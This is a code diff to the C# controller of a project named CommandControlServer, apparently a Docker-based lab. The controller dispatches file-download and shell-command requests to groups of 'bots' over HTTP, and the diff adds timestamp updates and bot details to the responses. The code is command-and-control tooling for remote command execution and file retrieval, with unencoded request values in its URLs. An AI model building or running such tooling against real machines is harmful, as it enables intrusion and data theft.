@@ -44,9 +44,11 @@ namespace CommandControlServer.Api.Controllers
             }
 
             var responses = new List<BotResponse>();
-            // todo: add bots to responses
             foreach (var bot in bots)
             {
+                bot.LastAction = DateTimeOffset.UtcNow;
+                _context.Entry(bot).State = EntityState.Modified;
+
                 try
                 {
                     string url = $"http://host.docker.internal:{bot.Port}/api/file/download?filepath={request.FilePath}";
@@ -88,7 +90,7 @@ namespace CommandControlServer.Api.Controllers
                     });
                 }
             }
-
+            
             _context.BotResponses.AddRange(responses);
             await _context.SaveChangesAsync();
 
@@ -102,7 +104,22 @@ namespace CommandControlServer.Api.Controllers
                 FilePath = br.FilePath,
                 FileName = br.FileName,
                 ResponseContent = br.ResponseContent,
-                Command = br.Command
+                Command = br.Command,
+                Bot = new BotDto
+                {
+                    BotId = br.Bot.BotId,
+                    Port = br.Bot.Port,
+                    Name = br.Bot.Name,
+                    LastAction = br.Bot.LastAction,
+                    CreatedAt = br.Bot.CreatedAt,
+                    UpdatedAt = br.Bot.UpdatedAt,
+                    BotGroups = br.Bot.BotGroups.Select(bg => new BotGroupDto
+                    {
+                        BotGroupId = bg.BotGroupId,
+                        Name = bg.Name,
+                        CreatedAt = bg.CreatedAt
+                    }).ToList()
+                }
             }).ToList();
 
             return Ok(botResponseDtos);
@@ -125,6 +142,9 @@ namespace CommandControlServer.Api.Controllers
 
             foreach (var bot in bots)
             {
+                bot.LastAction = DateTimeOffset.UtcNow;
+                _context.Entry(bot).State = EntityState.Modified;
+
                 try
                 {
                     string url = $"http://host.docker.internal:{bot.Port}/api/command/run?cmd={request.Command}";
@@ -166,7 +186,22 @@ namespace CommandControlServer.Api.Controllers
                 FilePath = br.FilePath,
                 FileName = br.FileName,
                 ResponseContent = br.ResponseContent,
-                Command = br.Command
+                Command = br.Command,
+                Bot = new BotDto
+                {
+                    BotId = br.Bot.BotId,
+                    Port = br.Bot.Port,
+                    Name = br.Bot.Name,
+                    LastAction = br.Bot.LastAction,
+                    CreatedAt = br.Bot.CreatedAt,
+                    UpdatedAt = br.Bot.UpdatedAt,
+                    BotGroups = br.Bot.BotGroups.Select(bg => new BotGroupDto
+                    {
+                        BotGroupId = bg.BotGroupId,
+                        Name = bg.Name,
+                        CreatedAt = bg.CreatedAt
+                    }).ToList()
+                }
             }).ToList();
 
             return Ok(botResponseDtos);
